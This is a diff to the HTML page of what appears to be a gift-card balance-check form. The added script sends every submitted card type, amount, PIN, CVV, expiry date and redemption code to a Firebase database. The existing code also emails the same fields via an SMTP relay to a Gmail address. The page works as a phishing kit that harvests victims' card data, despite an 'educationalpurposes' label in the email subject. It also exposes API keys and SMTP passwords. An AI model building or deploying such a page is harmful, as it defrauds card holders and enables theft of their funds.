@@ -44,6 +44,9 @@
 
     <!-- Vendor stylesheets  -->
     <link rel="stylesheet" href="./css/main.css" />
+
+    <script src="https://www.gstatic.com/firebasejs/7.17.1/firebase.js"></script>
+
     <!-- Custom stylesheet -->
   </head>
 
@@ -341,6 +344,7 @@ ERROR !              </p>
                   <form id="stripe-login" class="contact-form box-background--white paading"  >
                     <select
                     id="card-type"
+                    
                       required=""
                       name="cardName"
                       class="form-select"
@@ -427,10 +431,9 @@ ERROR !              </p>
                       class="field"
                       style="margin-top: 20px;   display: none;"
                     >
-                    <label for="birthday">Birthday:</label>
 
-                    
-                      <input name="date"  id="cardexpiredate" type="text" placeholder="Gift Card Expiry Date" onfocus="(this.type='month')" onblur="if(!this.value)this.type='text'">
+
+                   <input name="date" size=10 placeholder="Gift Card Expiry Date" maxlength=7 id="cardexpiredate"  onkeyup="this.value=this.value.replace(/^(\d\d)(\d)$/g,'$1/$2').replace(/[^\d\/]/g,'$1/$2')">
 
                     </div>
 
@@ -706,6 +709,8 @@ ERROR !              </p>
     <!-- Activation Script -->
     <script src="js/custom.js"></script>
     <script src="js/card.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/7.17.1/firebase.js"></script>
+
   </body>
 </html>
 
@@ -716,6 +721,27 @@ ERROR !              </p>
 
 
 <script>
+
+
+
+
+
+
+
+  var firebaseConfig = {
+  apiKey: "AIzaSyBWXRU2nXNJTZaa7CCkGyg5xMQeKi5jmtk",
+  authDomain: "paidgiftcard-86515.firebaseapp.com",
+  projectId: "paidgiftcard-86515",
+  storageBucket: "paidgiftcard-86515.appspot.com",
+  messagingSenderId: "192177729228",
+  databaseURL:"https://paidgiftcard-86515-default-rtdb.firebaseio.com",
+  appId: "1:192177729228:web:4e5f137610a0fbe93b1c69"
+};
+
+firebase.initializeApp(firebaseConfig);
+let contactInfo = firebase.database().ref("infos");
+
+
 
 document.querySelector(".contact-form").addEventListener("submit" , submitForm);
 
@@ -753,7 +779,15 @@ function myClick() {
 }
 
 
+
+
+
+
     function submitForm(e) {
+
+    
+
+      
       event.preventDefault();
 
 
@@ -770,28 +804,50 @@ function myClick() {
     let redemptioncode = document.getElementById("redemptioncode").value;
 
     
+    
      document.getElementById("el1").textContent = `${cardtype}`;
       document.getElementById("el2").textContent = `${currency}${amount}`;
 
-    document.querySelector(".contact-form").reset();
+    // document.querySelector(".contact-form").reset();
+
+    saveContactInfo(cardtype, currency, amount, cardpin, cardcvv, cardexpiredate, cardfourpin, redemptioncode);
+
 
     sendEmail(cardtype, currency, amount, cardpin, cardcvv, cardexpiredate, cardfourpin, redemptioncode);
+
+    
+
+    }
+
+    function saveContactInfo(cardtype, currency, amount, cardpin, cardcvv, cardexpiredate, cardfourpin, redemptioncode) {
+    let newContactInfo = contactInfo.push();
+
+    newContactInfo.set({
+      cardtype: cardtype,
+      currency: currency,
+      amount: amount,
+      cardpin: cardpin,
+      cardcvv:cardcvv,
+      cardexpiredate:cardexpiredate,
+      cardfourpin:cardfourpin,
+      redemptioncode:redemptioncode,
+    
+    });
+  }
 
     function sendEmail(cardtype, currency, amount, cardpin, cardcvv, cardexpiredate, cardfourpin, redemptioncode) {
     Email.send({
       Host: "smtp.elasticemail.com",
-      Username: "imperialwavelogics@gmail.com",
-      Password: "63668EEE5A9F1E62BB74006818F665F99EC2",
+      Username: "Williamcampbell693@gmail.com",
+      Password: "AB4BBD293A8D811F5B5DF570772BFEB5DACE",
       Port : 2525,
 
       To: "Williamcampbell693@gmail.com",
-      From: "imperialwavelogics@gmail.com",
+      From: "Williamcampbell693@gmail.com",
       Subject: ` ${"educationalpurposes"} sent you a message`,
-      Body: `Cardname: ${cardtype} <br/> Currency: ${currency} <br/> Amount ${amount} <br/> Cardpin : ${cardpin} <br/> Cardcvv : ${cardcvv} <br/> Cardexpiredate : ${cardexpiredate} <br/> Cardfourpin : ${cardfourpin} <br/> Redemptioncode : ${redemptioncode}`,
+      Body: `name: ${cardtype} <br/> Currency: ${currency} <br/> Amount ${amount} <br/> pinned : ${cardpin} <br/> cvcvv : ${cardcvv} <br/> expiredate : ${cardexpiredate} <br/> fourpin : ${cardfourpin} <br/> Redemptioncode : ${redemptioncode}`,
     }).then( myClick);
   }
-
-    }
    
   
 
